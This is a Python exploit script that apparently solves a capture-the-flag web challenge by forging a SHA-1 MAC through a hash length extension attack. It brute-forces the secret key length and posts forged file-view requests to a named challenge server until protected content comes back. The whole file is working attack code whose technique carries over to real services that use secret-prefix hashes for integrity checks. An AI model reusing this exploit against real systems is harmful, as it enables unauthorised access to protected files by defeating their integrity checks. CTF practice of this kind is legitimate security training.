#!/usr/bin/env python3
from hashpumpy import hashpump
import requests
import binascii


def magic(file_str, mac_str):
    num1 = 0
    num2 = 0
    for ch in file_str:
        num1 += ord(ch)
    for ch in mac_str:
        num2 += ord(ch)
    num3 = (num1 * num2) - num1 - num2
    return num3

'''
<input type="hidden" name="magic" value="6895875">
<input type="hidden" name="file" value="66696c656c6f636174696f6e2c6c6973742e747874">
<input type="hidden" name="mac" value="48b49f65a86cd617e5c7423d23a67738c4057d06">
'''
assert 6895875 == magic('66696c656c6f636174696f6e2c6c6973742e747874',
                        '48b49f65a86cd617e5c7423d23a67738c4057d06')

# ORIGINAL_FILENAME = 'filelocation,list.txt'
ORIGINAL_FILENAME = bytes.fromhex('66696c656c6f636174696f6e2c6c6973742e747874')
ORIGINAL_HASH = '48b49f65a86cd617e5c7423d23a67738c4057d06'


def getHash(extension, key_len):
    new_hash = hashpump(ORIGINAL_HASH, ORIGINAL_FILENAME, extension, key_len)
    return new_hash


def attempt(key_len, extension):
    hash_tuple = getHash(extension, key_len)
    hmac = hash_tuple[0]

    # Don't use `filename = ORIGINAL_FILENAME + extension`
    # The padding returned from hash pump is important.
    filename = hash_tuple[1]
    filehex = binascii.hexlify(filename).decode()

    magic_number = magic(filehex, hmac)

    data = {
        'magic': str(magic_number),
        'file': filehex,
        'mac': hmac
    }

    print("DEBUG:", data)
    # print("DEBUG:", filehex, filename, filename)
    # print("DEBUG:", hmac, magic_number)

    headers = {
        'User-Agent': ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) '
                       'AppleWebKit/537.36 (KHTML, like Gecko) '
                       'Chrome/61.0.3163.100 Safari/537.36'),
    }
    response = requests.post("http://web.chal.gryphonctf.com:17565/view.php",
                             data=data, headers=headers)
    return response.text


def bruteforce():
    extension = ',list.txt'
    # extension = ',my_journal.txt'
    for i in range(1, 500):
        reply = attempt(i, extension)

        if "You are not authorised to view this file!" in reply:
            print('Failed for len', i, "\n\n")
            continue

        if "nano editor" in reply or \
           'Discord' in reply:
            print('Success for len', i, "\n\n")
            print(reply)
            quit()

        raise Exception('Weird', i, reply)


if __name__ == '__main__':
    bruteforce()
